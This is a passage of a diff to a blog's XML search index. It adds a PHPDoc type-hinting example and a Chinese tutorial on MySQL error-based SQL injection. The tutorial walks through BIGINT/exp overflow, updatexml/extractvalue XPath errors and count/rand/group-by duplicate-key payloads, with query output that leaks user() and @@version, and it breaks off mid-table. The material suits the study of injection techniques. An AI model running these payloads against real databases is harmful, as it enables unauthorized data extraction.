class="keyword">Class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">printLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;login;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Abstract</span> <span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> $items = [];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line"> <span class="comment">//... abstract methods which will be shared among child-classes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> User current()</span></span><br><span class="line"><span class="comment"> * ...rest of methods (for ArrayAccess) if needed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UserCollection</span> <span class="keyword">extends</span> <span class="title">MyCollection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(User $user)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;items[] = $user;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// User collection specific methods...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>现在，使用类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$collection = <span class="keyword">new</span> UserCollection();</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">1</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">2</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($collection <span class="keyword">as</span> $user) &#123;</span><br><span class="line"> <span class="comment">// IDE should `recognize` method `printLogin()` here!</span></span><br><span class="line"> $user-&gt;printLogin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再次：我怀疑并不是所有的IDE都支持它，而PhpStorm则是这样。尝试你的，发表评论结果！</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
+<li><a href="https://stackoverflow.com/questions/778564/phpdoc-type-hinting-for-array-of-objects%3Fanswertab%3Dvotes" target="_blank" rel="noopener">PHPDoc type hinting for array of objects?</a></li>
 </ul>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td></td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-<tr>
-<td>tom</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<table>
-<thead>
-<tr>
-<th>key</th>
-<th>count(*)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>jack</td>
-<td>1+1</td>
-</tr>
-<tr>
-<td>tom</td>
-<td>1</td>
-</tr>
-<tr>
-<td>candy</td>
-<td>1</td>
-</tr>
-</tbody>
-</table>
-<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       
         
         <tags>
             
-            <tag> mysql </tag>
-            
-            <tag> sql </tag>
-            
-            <tag> injection </tag>
+            <tag> PHP PHPstorm IDE </tag>
             
         </tags>
         
@@ -516,6 +456,159 @@
             <tag> security </tag>
             
             <tag> hack </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Mysql注入后利用]]></title>
+      <url>/2018/01/06/mysql-injection/</url>
+      <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
+<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
+<ol>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>一些特性</li>
+</ol>
+<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
+<a id="more"></a>
+<h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure>
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure>
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</span><br></pre></td></tr></table></figure>
+<p>注入姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure>
+<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
+<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos;</span><br></pre></td></tr></table></figure>
+<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&apos;/a/b&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
+<ul>
+<li>先是建立虚拟表，其中key为主键，不可重复：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+<tr>
+<td>candy</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> sql </tag>
+            
+            <tag> injection </tag>
             
         </tags>
         
